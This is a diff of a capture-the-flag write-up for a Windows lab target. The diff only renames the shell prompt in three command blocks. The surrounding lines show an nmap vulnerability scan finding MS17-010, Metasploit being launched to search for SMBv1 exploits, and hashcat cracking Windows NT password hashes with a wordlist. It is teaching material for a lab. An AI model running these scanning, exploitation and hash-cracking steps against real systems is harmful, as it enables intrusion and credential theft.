@@ -1,6 +1,6 @@
 # recon
 ```console
-kali@kali:~/blue$ nmap -sV -vv --script vuln 10.10.184.211
+bibo318@parrot:~/blue$ nmap -sV -vv --script vuln 10.10.184.211
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 18:01 EDT
 NSE: Loaded 149 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -125,7 +125,7 @@ Bingo ! the target is vulerable to ms17-010, Remote Code Execution vulnerability
 
 # gain access
 ```console
-kali@kali:~/blue$ msfconsole # fire metasploit
+bibo318@parrot:~/blue$ msfconsole # fire metasploit
 msf5$ search SMBv1 # search for vuln
 Matching Modules
 ================
@@ -262,8 +262,8 @@ Each field is separated with colon. The fields are:
 
 Window password is hash with **Windows NT hashes** (-m 1000 in hashcat). Now run hashcat to crack them all!!
 ```console
-kali@kali:~/blue$ nano hash.txt # put all hashed inside
-kali@kali:~/blue$ hashcat -m 1000 -a 0 -o blue.txt hash.txt /usr/share/wordlists/rockyou.txt  --force
+bibo318@parrot:~/blue$ nano hash.txt # put all hashed inside
+bibo318@parrot:~/blue$ hashcat -m 1000 -a 0 -o blue.txt hash.txt /usr/share/wordlists/rockyou.txt  --force
 ```
 # flag
 Try to have fun and try to find it by yourself!!
